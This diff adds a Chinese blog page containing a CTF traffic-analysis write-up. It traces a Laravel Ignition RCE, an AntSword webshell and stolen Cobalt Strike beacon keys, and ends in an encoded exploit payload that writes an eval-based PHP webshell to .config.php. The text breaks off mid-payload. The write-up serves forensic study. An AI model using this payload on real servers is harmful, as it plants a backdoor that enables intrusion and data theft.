@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>绿城杯流量分析 | Polo&#39;s Blog</title>
+  <meta name="description" content="这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包在这里看到了很多ignition之类的包，百度了下这是一个laravel的RCE。后面的包一直在向.config.php post数据，怀疑config.php是写的马，跟进去看看。使用http contains config过滤出来。很明显是webshell了，这是在执行ls继续跟踪这个webshell的数据包，看看有无有价值的信息">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绿城杯流量分析">
+<meta property="og:url" content="https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包在这里看到了很多ignition之类的包，百度了下这是一个laravel的RCE。后面的包一直在向.config.php post数据，怀疑config.php是写的马，跟进去看看。使用http contains config过滤出来。很明显是webshell了，这是在执行ls继续跟踪这个webshell的数据包，看看有无有价值的信息">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/1633578377113neqkckzh.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/1633578510720pypykjsw.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/16336126404051wc58fdp.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/163361286315319q01mf9.png?imageslim">
+<meta property="og:image" content="http://cdn.polowong.top/1633612982627c0it3dfp.png?imageslim">
+<meta property="article:published_time" content="2021-10-07T02:33:09.000Z">
+<meta property="article:modified_time" content="2021-10-07T13:25:07.241Z">
+<meta property="article:author" content="Polo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://polosec.github.io/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Polo&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/polosec" target="_blank">
+          <img class="img-circle img-rotate" src="http://cdn.polowong.top/1.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Polo</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer&amp;Cybersec Researcher</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Beijing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>null</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/wp/">wp</a><span class="category-list-count">5</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0307xctf/" rel="tag">0307xctf</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c%E8%AF%AD%E8%A8%80/" rel="tag">c语言</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">29</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%96%E8%AF%81/" rel="tag">取证</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/0307xctf/" style="font-size: 13.33px;">0307xctf</a> <a href="/tags/awd/" style="font-size: 13px;">awd</a> <a href="/tags/buu/" style="font-size: 13.5px;">buu</a> <a href="/tags/buuoj/" style="font-size: 13.5px;">buuoj</a> <a href="/tags/c/" style="font-size: 13px;">c++</a> <a href="/tags/ctf/" style="font-size: 13px;">ctf</a> <a href="/tags/c%E8%AF%AD%E8%A8%80/" style="font-size: 13px;">c语言</a> <a href="/tags/git/" style="font-size: 13px;">git</a> <a href="/tags/linux/" style="font-size: 13.17px;">linux</a> <a href="/tags/misc/" style="font-size: 13.83px;">misc</a> <a href="/tags/mysql/" style="font-size: 13.17px;">mysql</a> <a href="/tags/php/" style="font-size: 13.67px;">php</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 13.17px;">内网渗透</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13px;">反序列化</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size: 13px;">取证</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 13.17px;">密码学</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 13px;">杂项</a> <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 13px;">流量分析</a> <a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 13.17px;">网络</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">16</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="title">绿城杯流量分析</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-10-07T02:33:09.000Z" itemprop="datePublished">2021-10-07</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/09/24/Analysis-of-flask-memory-webshell/" class="title">Analysis of flask memory webshell</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-09-24T13:16:39.000Z" itemprop="datePublished">2021-09-24</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/09/05/webshell-in-flask/" class="title">implementation of memory webshell in flask</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-09-05T09:30:36.000Z" itemprop="datePublished">2021-09-05</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/" class="title">AWD新手的不死马及权限维持思路</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-05-29T02:42:40.000Z" itemprop="datePublished">2021-05-29</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/" class="title">安网杯部分wp</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-05-12T09:57:42.000Z" itemprop="datePublished">2021-05-12</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-绿城杯流量分析" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      绿城杯流量分析
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="article-date">
+	  <time datetime="2021-10-07T02:33:09.000Z" itemprop="datePublished">2021-10-07</time>
+	</a>
+</span>
+        
+        
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 3.5k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 19(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p>这题挺有意思的，还是按流量分析的思路来做，个人习惯先看post包<img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image">在这里看到了很多ignition之类的包，百度了下这是一个laravel的RCE。后面的包一直在向.config.php post数据，怀疑config.php是写的马，跟进去看看。使用http contains config过滤出来。<img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image">很明显是webshell了，这是在执行ls<img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image">继续跟踪这个webshell的数据包，看看有无有价值的信息。<img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image">看到了一个secret.zip，但是http对象导出并没有这玩意。继续追踪看到了pk开头的一段数据，考虑是压缩包，尝试进行还原。<img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image">需要注意的是，压缩包前后有两段字符串是蚁剑自带干扰流量特征的。还原之后是个加密的压缩包，不是伪加密，下一步的目的是找到压缩包的密码。同时需要注意的是，这里文件名和cobalt strike有关（rt废物狂喜），然后搜了下.cobaltstrike.beacon_keys这个东西是干嘛的。上述文件是一个序列化后的公钥私钥文件，CS的beacon会嵌入这个文件中的公钥，当然了，私钥是留给server自己的。下一步应该是对这个文件进行解密，获取CS的通信数据。既然知道了是cobalt strike的通信流量，那么需要找到beacon与teamserver交互的数据包，但这个前提是得到私钥。获取私钥的前提是解开压缩包的密码。下面需要做的是找压缩包的密码。<img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image">继续追踪数据包，在上面的包中看到了解压的操作。但是当时我直接对传输的数据进行URL+BASE64解码，并不能得到任何有价值的信息。那么接下来需要做的是看一看传的马的内容以及加密方式。在laravel RCE的包中可以找到payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3